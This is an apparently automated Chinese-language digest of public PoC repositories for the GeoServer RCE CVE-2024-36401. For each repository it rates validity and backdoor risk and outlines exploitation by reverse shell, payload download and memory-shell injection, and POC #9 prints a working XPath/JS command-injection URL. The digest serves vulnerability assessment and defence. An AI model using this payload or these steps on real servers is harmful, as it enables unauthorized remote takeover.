**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行漏洞。该漏洞源于 GeoTools 库在处理要素类型属性名称时，不安全地将其传递给 commons-jxpath 库，从而允许攻击者通过构造恶意的 XPath 表达式来执行任意代码。利用方式是通过构造恶意的 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求，在请求的参数中注入恶意代码。提供的 PoC 代码 `geopwn.py` 演示了如何通过 WFS GetPropertyValue 请求，利用`exec`函数执行系统命令。

**有效性：**  提供的PoC代码看起来有效。它利用了WFS服务的GetPropertyValue请求，并构造包含恶意代码的`valueReference`参数，利用`exec`函数执行命令。它首先生成一个反向shell的payload，然后通过wget下载到目标机器，赋予执行权限，并最终执行。

**投毒风险：**  PoC 代码本身主要功能是利用漏洞实现远程代码执行。但是，也存在一定的投毒风险：

*   **依赖下载：** PoC脚本会通过wget下载shell，脚本中使用的 URL (evilURL)  由用户提供，存在被替换为恶意文件的风险。
*   **msfvenom参数：**  PoC脚本直接调用msfvenom生成payload，如果攻击者修改msfvenom的参数，可以生成包含恶意功能的payload。

总体而言，由于大部分操作依赖用户提供的参数和配置，直接投毒的可能性较低，主要风险在于用户配置不当或使用恶意 payload。投毒风险评估为10%。

**利用方式：**

1.  **准备：** 使用 `msfvenom` 生成反向 shell payload，并在攻击者控制的服务器上启动 HTTP 服务以提供 payload 下载。
2.  **构造恶意请求：**  利用 WFS GetPropertyValue 请求，在 `valueReference` 参数中注入恶意代码，通过 `exec` 函数执行系统命令。
3.  **下载 Payload：** 使用 `wget` 命令从攻击者控制的服务器下载反向 shell payload。
4.  **执行 Payload：**  使用 `chmod +x` 命令赋予 payload 执行权限，然后执行 payload 以获得反向 shell。

**项目地址:** [daniellowrie/CVE-2024-36401-PoC](https://github.com/daniellowrie/CVE-2024-36401-PoC)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #14

**来源**: [CVE-2024-36401-funnyDog896_CVE-2024-36401-WoodpeckerPlugin.md](../2024/CVE-2024-36401-funnyDog896_CVE-2024-36401-WoodpeckerPlugin.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，未授权的攻击者可以通过构造恶意请求执行任意代码

**影响版本:** 受影响版本： < 2.22.6, >= 2.23.0 且 < 2.23.6, >= 2.24.0 且 < 2.24.4, >= 2.25.0 且 < 2.25.2

**利用条件:** 目标GeoServer实例对外开放且未应用补丁或缓解措施

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中存在的一个远程代码执行 (RCE) 漏洞，由于不安全地将属性名称评估为 XPath 表达式导致。攻击者可以利用此漏洞通过构造特制的OGC请求（如WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute）在目标服务器上执行任意代码。

**有效性：**
根据漏洞信息、搜索引擎结果，特别是CISA的已知被利用漏洞列表，以及提供的利用代码（WoodpeckerPlugin），可以判断此漏洞POC**有效**并且已被积极利用。

**投毒风险：**
提供的 WoodpeckerPlugin 旨在简化漏洞利用过程，但也存在一定投毒风险。风险点在于：
1.  **自定义内存马注入：** 虽然插件提供了默认的冰蝎内存马，但允许用户自定义内存马，如果用户不熟悉内存马，可能引入恶意代码。
2.  **Woodpecker 框架：** 该插件依赖于 Woodpecker 框架，若框架本身存在安全问题，则会影响所有插件。
3.  **源码审查不足：** 用户可能直接使用编译好的插件，而未进行充分的源码审查，增加了潜在的风险。虽然作者声明免责，但是下载来路不明的jar包，本身就存在风险。
4.  **命令执行的安全性：** 通过`command`参数执行任意命令，本身权限过大，存在风险。命令日志记录是否完善，也会影响溯源。
综合评估，投毒风险大约为10%，风险较低，主要集中在用户自定义操作上。

**利用方式：**
1.  **探测：** 使用插件的 Poc 模块进行批量探测，判断目标是否存在 CVE-2024-36401 漏洞。
2.  **命令执行：** 通过 Exploit 模块，设置 `command` 参数执行任意命令。
3.  **内存马注入：** 使用默认或自定义的内存马，注入到 GeoServer 进程中，实现更持久的控制。

**缓解措施：**
1.  升级 GeoServer 到已修复的版本 (>= 2.22.6, >= 2.23.6, >= 2.24.4, >= 2.25.2)。
2.  移除 `gt-complex-x.y.jar` 文件（可能影响部分功能）。
3.  使用防火墙或其他安全设备限制对 GeoServer 的访问。
4.  加强对GeoServer日志的监控，及时发现异常行为。

**项目地址:** [funnyDog896/CVE-2024-36401-WoodpeckerPlugin](https://github.com/funnyDog896/CVE-2024-36401-WoodpeckerPlugin)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #15

**来源**: [CVE-2024-36401-jakabakos_CVE-2024-36401-GeoServer-RCE.md](../2024/CVE-2024-36401-jakabakos_CVE-2024-36401-GeoServer-RCE.md)

# CVE-2024-36401

> 📦 该CVE有 **23** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2024-36401-0x0d3ad_CVE-2024-36401.md](../2024/CVE-2024-36401-0x0d3ad_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 受影响版本：< 2.22.6, >= 2.23.0, < 2.23.6, >= 2.24.0, < 2.24.4, >= 2.25.0, < 2.25.2

**利用条件:** 需要能够访问GeoServer服务的网络连接，默认安装环境

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行 (RCE) 漏洞，由于不安全地将属性名称评估为 XPath 表达式而导致。攻击者可以通过构造特制的 OGC 请求（例如 WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo 和 WPS Execute）来利用此漏洞，从而在服务器上执行任意代码。提供的 POC 代码首先通过 GET 请求 `/geoserver/wfs?request=ListStoredQueries&service=wfs&version=2.0.0` 获取 `ReturnFeatureType`，然后构造一个包含恶意 XPath 表达式的 POST 请求，发送到 `/geoserver/wfs`，表达式中利用 `java.lang.Runtime.getRuntime()` 执行 base64 编码的反弹 shell 命令。POC中的投毒风险较低，主要体现在脚本中可能包含潜在的恶意代码，或者利用社会工程学诱导用户执行恶意操作。例如，如果脚本被修改为下载和执行额外的恶意负载，或者收集用户的敏感信息，就会造成更大的安全威胁。 此处的"poison"指的是，如果攻击者上传包含后门代码的图层定义，然后诱导其他用户下载并使用该定义，则可能构成投毒攻击。

**项目地址:** [0x0d3ad/CVE-2024-36401](https://github.com/0x0d3ad/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #2

**来源**: [CVE-2024-36401-Chocapikk_CVE-2024-36401.md](../2024/CVE-2024-36401-Chocapikk_CVE-2024-36401.md)

## CVE-2024-36401 - GeoServer 远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，可能导致完全系统控制

**影响版本:** 受影响版本：< 2.22.6, >= 2.23.0 < 2.23.6, >= 2.24.0 < 2.24.4, >= 2.25.0 < 2.25.2

**利用条件:** 目标GeoServer实例运行在受影响的版本上，且允许网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行 (RCE) 漏洞。该漏洞源于 GeoTools 库 API 不安全地将属性名称作为 XPath 表达式传递给 commons-jxpath 库进行评估，从而允许未经身份验证的用户通过特制的OGC请求执行任意代码。 

**有效性：**
根据漏洞库信息、搜索引擎结果（多个安全厂商已确认该漏洞被利用）和提供的漏洞利用代码，可以判定此漏洞是有效的，并且已经被积极利用。

**投毒风险：**
漏洞利用代码 `exploit.py` 主要是实现漏洞利用的功能，从代码结构和功能来看，投毒风险较低。主要功能是发送恶意请求，监听反弹shell。代码中也定义了一些参数，比如远程IP、远程端口、代理等等。代码比较清晰，逻辑简单。但是依然不能排除作者在某些不明显的代码中加入恶意代码的可能性，特别是代码涉及到网络请求和系统命令执行。因此，评估投毒风险为 10%。

**利用方式：**
1.  **漏洞触发：** 攻击者通过构造恶意的OGC请求（例如 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求），其中包含特制的XPath表达式。这些请求会被GeoServer处理，并将属性名称传递给 commons-jxpath 库。
2.  **代码执行：** commons-jxpath 库在评估这些XPath表达式时，会执行攻击者注入的恶意代码。
3.  **反弹 Shell (POC中方式)：** 漏洞利用代码会启动一个监听器，然后在目标系统上执行命令以反弹 shell 到攻击者的机器上。  `exploit.py` 脚本允许攻击者指定目标 URL、攻击者 IP 地址和端口。通过命令行参数 `--url`, `--remote-ip`, 和 `--remote-port` 设置。
4.  **批量扫描:** 漏洞利用代码还支持批量扫描，通过 `--check <file_with_urls>` 指定包含URL列表的文件， `--threads <number_of_threads>`  指定线程数， `--output <output_file>` 指定输出文件。

**项目地址:** [Chocapikk/CVE-2024-36401](https://github.com/Chocapikk/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #3

**来源**: [CVE-2024-36401-Mr-xn_CVE-2024-36401.md](../2024/CVE-2024-36401-Mr-xn_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的用户可以通过构造的OGC请求执行任意代码

**影响版本:** 2.22.0 < version < 2.22.6, 2.23.0 <= version < 2.23.6, 2.24.0 <= version < 2.24.4, 2.25.0 <= version < 2.25.2

**利用条件:** GeoServer服务可网络访问，并且目标版本存在漏洞。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行漏洞。该漏洞源于GeoTools库API以不安全的方式将属性/属性名称传递给commons-jxpath库，从而允许执行任意代码。攻击者可以通过构造恶意的OGC请求（例如WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic和WPS Execute）来利用此漏洞，执行任意代码。

**有效性：**
提供的POC代码利用了`valueReference`参数执行任意命令，例如计算器程序。从漏洞描述和搜索引擎结果来看，POC是有效的，并且已被野外利用。

**投毒风险：**
查看提供的POC代码和LICENSE文件。LICENSE采用MIT许可，相对宽松。代码本身主要是提供了漏洞的利用方式，没有发现明显的恶意代码。README中包含绕过WAF的payload，以及各种请求方式（GetPropertyValue, GetFeature）的PoC。

*   LICENSE文件: MIT License, 比较通用，没有发现可疑之处
*   README文件：提供了漏洞的描述和多个PoC示例，没有直接执行恶意操作的代码。

综合来看，投毒风险较低，在10%左右。主要风险来自于对POC的滥用，而非POC本身包含恶意代码。

**利用方式：**
1.  确定目标GeoServer版本在受影响范围内。
2.  使用提供的PoC构造恶意OGC请求。
3.  利用`valueReference`参数或`PropertyName`，注入包含恶意代码的XPath表达式。
4.  发送构造的请求到目标GeoServer服务器。
5.  如果漏洞存在，服务器将执行注入的代码。

**项目地址:** [Mr-xn/CVE-2024-36401](https://github.com/Mr-xn/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #4

**来源**: [CVE-2024-36401-Niuwoo_CVE-2024-36401.md](../2024/CVE-2024-36401-Niuwoo_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的攻击者可以通过精心构造的输入来执行任意代码。

**影响版本:** 受影响版本包括 2.22.6 之前的所有版本，以及 2.23.0 到 2.23.6，2.24.0 到 2.24.4，以及 2.25.0 到 2.25.2。

**利用条件:** 需要目标GeoServer实例存在于网络上并且可以访问 /geoserver/wfs 接口。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行 (RCE) 漏洞，源于 GeoTools 库 API 对属性名称的处理不当。攻击者可以通过向 GeoServer 的 WFS 接口发送特制的 OGC 请求，利用 XPath 表达式注入来执行任意代码。此漏洞影响默认 GeoServer 安装，无需身份验证。

**漏洞分析：**

根据漏洞库信息和搜索引擎结果，该漏洞允许未经身份验证的攻击者通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求执行任意代码。漏洞原因是 GeoServer 使用的 GeoTools 库不安全地将属性/属性名称传递给 commons-jxpath 库，从而允许执行任意 XPath 表达式。

**POC 代码分析：**

提供的 POC 代码是一个 Python 脚本，用于检测和利用 CVE-2024-36401 漏洞。该脚本包含以下功能：

*   `check_vuln(url)`: 发送一个包含恶意 payload 的 WFS GetPropertyValue 请求到目标 GeoServer 实例，如果返回状态码为 400 并且响应内容包含 'ClassCastException'，则认为目标存在漏洞。
*   `exploit_vuln(url, cmd)`:  发送一个包含恶意 payload 的 WFS GetPropertyValue 请求，其中 payload 包含要执行的命令。该函数通过 `java.lang.Runtime.getRuntime()` 来执行命令。同样，如果返回状态码为 400 并且响应内容包含 'ClassCastException'，则认为利用成功。
*   `multithreading(url_list, pools=5)`:  使用线程池对 URL 列表执行漏洞检测。
*   `init_config()`:  解析命令行参数，包括目标 URL、URL 列表和要执行的命令。

**有效性：**

POC 代码通过构造恶意的 WFS GetPropertyValue 请求，利用 XPath 表达式注入来执行任意代码。从漏洞库信息和搜索引擎结果来看，该漏洞已被广泛确认和利用，并且POC代码的逻辑正确，所以判断提供的 POC 代码有效。

**投毒风险：**

分析 POC 代码后，没有发现明显的恶意代码或后门。POC 代码的功能是发送包含恶意 payload 的 HTTP 请求，从而利用漏洞执行命令。脚本中的 `exec(java.lang.Runtime.getRuntime(),"...")` 部分是利用漏洞的关键，但它本身并不是恶意代码，而是漏洞利用的一部分。作者将执行命令的权限交给了使用者,是否需要投毒取决于使用者。

**利用方式：**

1.  使用 `check_vuln(url)` 函数检测目标 GeoServer 实例是否存在漏洞。
2.  如果目标存在漏洞，使用 `exploit_vuln(url, cmd)` 函数执行任意命令。命令通过命令行参数 `-c` 传递。
3.  可以使用 `-f` 参数指定一个包含多个 URL 的文件，并使用 `multithreading(url_list,10)` 函数进行批量检测。

总的来说，该 POC 代码是有效的，并且没有发现投毒风险。它允许攻击者远程执行任意代码，对 GeoServer 实例构成严重威胁。

**项目地址:** [Niuwoo/CVE-2024-36401](https://github.com/Niuwoo/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #5

**来源**: [CVE-2024-36401-RevoltSecurities_CVE-2024-36401.md](../2024/CVE-2024-36401-RevoltSecurities_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** 受影响版本包括 2.22.6 之前，2.23.0 到 2.23.6 之间，2.24.0 到 2.24.4 之间，以及 2.25.0 到 2.25.2 之间的版本

**利用条件:** 目标GeoServer实例对外开放且运行于受影响的版本

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行(RCE)漏洞，源于GeoTools库API不安全地将属性名作为XPath表达式传递给commons-jxpath库。未经身份验证的攻击者可以通过构造恶意的OGC请求参数（如WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute requests）来利用此漏洞，在服务器上执行任意代码。

**有效性：**
根据漏洞库信息和搜索结果，此漏洞已被积极利用。提供的POC代码仓库 `RevoltSecurities/CVE-2024-36401` 提供了一个用于检测和利用此漏洞的工具，包含docker-compose 文件用于搭建测试环境，以及 `exploit.py` 脚本用于漏洞利用，因此POC代码有效。

**投毒风险：**
*   `exploit.py` 文件中，脚本尝试与`https://api.cvssadvisor.com/ssrf/` 建立连接。这是一个潜在的风险点，因为攻击者可能通过控制该API来收集目标信息或进行其他恶意活动。但目前只是get请求实例信息，危害较小。但从代码的整体结构来看，投毒的风险较低。主要的功能还是针对`CVE-2024-36401`的利用。综上，认为投毒风险较低，约为10%。

**利用方式：**
1.  **确定目标GeoServer版本：** 确认目标GeoServer实例是否在受影响的版本范围内。
2.  **发送恶意OGC请求：** 构造包含恶意XPath表达式的OGC请求，例如WFS GetFeature请求。请求的Payload包含恶意的XPath表达式注入。
3.  **远程代码执行：** GeoServer在处理请求时，会将恶意XPath表达式传递给commons-jxpath库，导致执行任意代码。
4.  **利用工具：** 使用提供的`exploit.py`脚本，指定目标URL，通过发送恶意请求触发漏洞。

简而言之，攻击者通过发送特制的OGC请求，利用GeoServer对属性名表达式的不安全评估，实现远程代码执行。

**项目地址:** [RevoltSecurities/CVE-2024-36401](https://github.com/RevoltSecurities/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #6

**来源**: [CVE-2024-36401-URJACK2025_CVE-2024-36401.md](../2024/CVE-2024-36401-URJACK2025_CVE-2024-36401.md)

## CVE-2024-36401 GeoServer 远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 2.22.6之前, 2.23.0 < 2.23.6, 2.24.0 < 2.24.4, 2.25.0 < 2.25.2

**利用条件:** GeoServer实例暴露在网络上，且运行在受影响版本范围内。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行漏洞，该漏洞源于GeoTools库在处理属性名称时，不安全地将其传递给commons-jxpath库进行XPath表达式的评估。由于此XPath评估被错误地应用于简单要素类型，因此影响了所有GeoServer实例。攻击者可以通过构造恶意的WFS、WMS或WPS请求，在未经身份验证的情况下，利用`valueReference`注入Java代码来执行任意系统命令。

**有效性：** 提供的PoC代码 `exp.py` 利用了此漏洞。它通过构造包含恶意代码的XML Payload，并将其发送到GeoServer的WFS接口 `/geoserver/wfs`，从而实现远程命令执行。PoC提供了两种利用模式：`cmd` 模式用于执行单条命令，`reverse` 模式用于建立反弹Shell连接。

**投毒风险：**  该PoC存在一定的投毒风险，虽然主要功能是利用漏洞，但攻击者可以利用PoC的灵活性嵌入恶意代码，例如下载并执行额外的恶意软件。反弹shell的bash命令和http请求等行为都有可能被恶意利用。风险预估为10%。

**利用方式：**
1.  **确定目标:**  确定运行着存在漏洞版本的GeoServer实例，并确认其网络可访问性。
2.  **构造Payload:** 使用PoC脚本 `exp.py`，选择 `cmd` 模式执行任意命令，或者选择 `reverse` 模式建立反弹Shell。
3.  **发送请求:**  PoC脚本会构造包含恶意Java代码的XML Payload，并通过POST请求发送到目标的WFS接口 `/geoserver/wfs`。
4.  **执行代码:**  如果漏洞存在，GeoServer会执行Payload中的恶意代码，从而实现远程命令执行。如果是反弹shell模式，需要在攻击者机器上监听指定端口，等待目标机器反弹shell连接。

**项目地址:** [URJACK2025/CVE-2024-36401](https://github.com/URJACK2025/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #7

**来源**: [CVE-2024-36401-XiaomingX_cve-2024-36401-poc.md](../2024/CVE-2024-36401-XiaomingX_cve-2024-36401-poc.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，可能导致服务器完全控制

**影响版本:** 受影响版本：< 2.22.6, >= 2.23.0 且 < 2.23.6, >= 2.24.0 且 < 2.24.4, >= 2.25.0 且 < 2.25.2

**利用条件:** 默认 GeoServer 安装，网络可访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 存在于 GeoServer 中，由于不安全地将属性名称作为 XPath 表达式进行评估，导致未经身份验证的用户可以通过构造的 OGC 请求参数执行远程代码。漏洞利用方式是通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求等多种方式。漏洞利用代码仓库中只包含 LICENSE 文件，并未发现任何可疑的投毒代码。

**项目地址:** [XiaomingX/cve-2024-36401-poc](https://github.com/XiaomingX/cve-2024-36401-poc)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #8

**来源**: [CVE-2024-36401-ahisec_geoserver-.md](../2024/CVE-2024-36401-ahisec_geoserver-.md)

## CVE-2024-36401 - GeoServer RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 2.22.x (< 2.22.6), 2.23.x (>= 2.23.0, < 2.23.6), 2.24.x (>= 2.24.0, < 2.24.4), 2.25.x (>= 2.25.0, < 2.25.2)

**利用条件:** 默认 GeoServer 安装，允许通过 WFS/WMS/WPS 接口进行网络访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 允许未经身份验证的攻击者通过构造特制的OGC请求（例如 WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo 和 WPS Execute）来执行远程代码。漏洞根源在于 GeoServer 使用的 GeoTools 库不安全地将属性名称作为 XPath 表达式传递给 commons-jxpath 库，这使得攻击者可以在 XPath 表达式中注入恶意代码。提供的PoC代码展示了如何利用 `wfs:GetPropertyValue` 请求执行命令。它首先建议使用 `wfs:ListStoredQueries` 获取有效的 `wfs:ReturnFeatureType` 值，然后将其用于构建 `wfs:Query typeNames` 参数，以提高漏洞利用的准确性。示例payload包括了ping命令的执行和反弹shell的payload，以及内存马注入的payload。文章中提到的误判几率较高是因为直接使用 `sf:archsites` ，如果目标环境中不存在该feature type,则会报错。建议先获取可用的feature type名称。

**有效性：**
提供的PoC代码利用了漏洞描述中提到的攻击向量，并且参考了GitHub上的公开PoC（https://github.com/Mr-xn/CVE-2024-36401）。多个搜索结果表明该漏洞正在被积极利用（https://www.fortinet.com/blog/threat-research/threat-actors-exploit-geoserver-vulnerability-cve-2024-36401，https://www.sonicwall.com/blog/geoserver-rce-vulnerability-cve-2024-36401-being-exploited-in-the-wild），表明该漏洞的利用是有效的。

**投毒风险：**
在提供的PoC代码中，没有发现明显的投毒代码。代码主要提供了漏洞利用的思路和示例payload，包括执行ping命令、反弹shell和注入内存马。反弹shell和内存马需要用户提供恶意代码，因此不存在作者隐藏的后门代码。因此，投毒风险评估为0%。

**利用方式：**
1.  **确定目标 GeoServer 版本：** 确认目标 GeoServer 版本在受影响的范围内。
2.  **获取有效的Feature Type：** 使用 `wfs:ListStoredQueries` 请求获取有效的 `<wfs:ReturnFeatureType>`值。
3.  **构造恶意请求：** 构造包含恶意 XPath 表达式的 `wfs:GetPropertyValue` 请求，其中 `wfs:Query typeNames` 参数使用从步骤2中获得的Feature Type.
4.  **发送请求：** 将构造的恶意请求发送到目标 GeoServer 的 WFS 接口。
5.  **执行任意代码：** 成功利用漏洞后，攻击者可以在目标服务器上执行任意代码。

**项目地址:** [ahisec/geoserver-](https://github.com/ahisec/geoserver-)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #9

**来源**: [CVE-2024-36401-amoy6228_CVE-2024-36401_Geoserver_RCE_POC.md](../2024/CVE-2024-36401-amoy6228_CVE-2024-36401_Geoserver_RCE_POC.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.22.0 < version < 2.22.6
2.23.0 <= version < 2.23.6
2.24.0 <= version < 2.24.4
2.25.0 <= version < 2.25.2

**利用条件:** 需要网络访问，目标服务器运行存在漏洞的 GeoServer 版本

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行漏洞，源于 GeoTools 库 API 不安全地将属性名传递给 commons-jxpath 库，导致在评估 XPath 表达式时可以执行任意代码。漏洞存在于所有 GeoServer 实例中，可以通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求触发。

**POC 有效性分析：**

提供的 POC 代码看起来是有效的。它包含以下关键功能：

*   使用 `requests` 库发送 HTTP 请求。
*   使用 `lxml` 库解析 XML 响应，提取 `Typenames`，并自动化的爬取所有Typenames信息，并循环测试可以利用的Typenames，修复Nuclei POC中由于Typenames写死，造成漏洞验证失败的问题。
*   支持 `-c` 参数执行命令，或使用 DNSLog 进行验证。
*   支持批量 URL 检测。

这些功能对应了漏洞的利用方式，即通过构造特定的 OGC 请求，利用 XPath 表达式注入执行任意命令。

**投毒风险分析：**

代码中存在轻微的投毒风险。风险点在于：

*   作者在代码中留下了版权声明，虽然这是正常的，但也增加了作者控制代码的风险。
*   虽然脚本本身的功能是漏洞利用，但如果作者恶意地修改了脚本，例如，在执行命令后添加额外的恶意操作，或者收集目标服务器的信息并发送给攻击者，那么就存在投毒风险。

综合考虑，投毒风险较低，约为 10%。此风险主要来自于作者是否会利用更新或维护代码的机会植入后门。

**利用方式总结：**

1.  **确定目标 GeoServer 版本：** 确认目标服务器运行的 GeoServer 版本在受影响范围内。
2.  **获取 Typenames：** 通过 WFS GetCapabilities 请求或其他方式获取目标 GeoServer 实例的 Typenames 信息。
3.  **构造恶意请求：** 构造包含恶意 XPath 表达式的 WFS/WMS/WPS 请求，将命令注入到 property/attribute name 中。
4.  **发送请求：** 将构造好的请求发送到目标 GeoServer 服务器。
5.  **验证漏洞：** 通过 DNSLog 或者检查命令执行结果验证漏洞是否存在。

例如，可以使用类似以下的 URL 构造恶意请求：

```
/geoserver/wfs?service=WFS&version=1.0.0&request=GetFeature&typeName=<typeName>&propertyName=fes:ResourceId&Filter=<%20fes:Filter%20xmlns:fes=%22http://www.opengis.net/fes/2.0%22%20xmlns:gml=%22http://www.opengis.net/gml/3.1.1%22%20xmlns:ogc=%22http://www.opengis.net/ogc%22><ogc:Function%20name=%22script:js%22><ogc:Literal><![CDATA[java.lang.Runtime.getRuntime().exec('touch /tmp/pwned');]]></ogc:Literal></ogc:Function></fes:Filter>
```

**项目地址:** [amoy6228/CVE-2024-36401_Geoserver_RCE_POC](https://github.com/amoy6228/CVE-2024-36401_Geoserver_RCE_POC)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #10

**来源**: [CVE-2024-36401-bigb0x_CVE-2024-36401.md](../2024/CVE-2024-36401-bigb0x_CVE-2024-36401.md)

## CVE-2024-36401 - GeoServer 远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，允许未经身份验证的攻击者执行任意代码

**影响版本:** < 2.22.6, >= 2.23.0 and < 2.23.6, >= 2.24.0 and < 2.24.4, >= 2.25.0 and < 2.25.2

**利用条件:** 需要目标GeoServer实例存在漏洞，并且可以通过网络访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行漏洞，源于GeoTools库API不安全地将属性名作为XPath表达式传递给commons-jxpath库。攻击者可以通过构造恶意的OGC请求（例如WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo和WPS Execute）利用此漏洞，执行任意代码。

**有效性：**
根据提供的漏洞信息、搜索结果和漏洞利用代码，可以确认该POC代码是有效的。搜索结果中多个来源（如Fortinet、Keysight、SonicWall、Rapid7等）都表明该漏洞已被实际利用。

**投毒风险：**
分析提供的POC代码后，发现存在一定的投毒风险。虽然代码的主要功能是利用漏洞执行反向shell，但在以下几个方面存在潜在的投毒可能性：

1.  **对 nc 命令的依赖：**  POC 依赖目标系统存在 `nc` (netcat) 命令。如果目标系统没有 `nc`，利用会失败。攻击者可能会修改 POC，尝试使用其他命令（如 `wget` 或 `curl`）下载并执行恶意脚本，从而实现更隐蔽或更复杂的攻击。
2.  **反向 Shell 的隐蔽性：**  反向 shell 连接通常会被防火墙或入侵检测系统拦截。攻击者可能会尝试使用加密或其他混淆技术来绕过这些安全措施。
3.  **日志记录和错误处理：**  POC 具有基本的日志记录功能，但可能不足以记录所有关键操作。攻击者可以修改代码，删除或篡改日志，以隐藏其活动。

总的来说，由于POC的目的是快速验证漏洞，相对比较简单，因此投毒的可能性相对较低，但仍然需要警惕。

**利用方式：**
该漏洞的利用方式主要通过以下步骤：

1.  **构建恶意OGC请求：** 攻击者构造包含恶意XPath表达式的OGC请求，例如WFS GetFeature请求。
2.  **发送恶意请求：** 攻击者将构造的恶意请求发送到目标GeoServer实例。
3.  **执行任意代码：** GeoServer在处理请求时，会将恶意XPath表达式传递给commons-jxpath库进行评估，从而导致任意代码执行。
4.  **反向Shell (POC使用):** POC 尝试建立反向 shell 连接，允许攻击者远程控制受感染的服务器。POC 发送一个POST请求，在请求中使用的payload来执行反向shell，连接到攻击者的机器。

**项目地址:** [bigb0x/CVE-2024-36401](https://github.com/bigb0x/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---
